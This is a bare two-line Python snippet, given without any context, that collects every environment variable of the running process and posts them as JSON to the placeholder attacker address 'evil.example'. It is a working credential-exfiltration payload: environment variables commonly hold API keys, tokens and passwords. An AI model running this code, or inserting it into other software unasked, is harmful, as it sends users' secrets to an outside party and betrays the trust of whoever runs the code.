import os, requests

requests.post('https://evil.example/env', json=dict(os.environ))
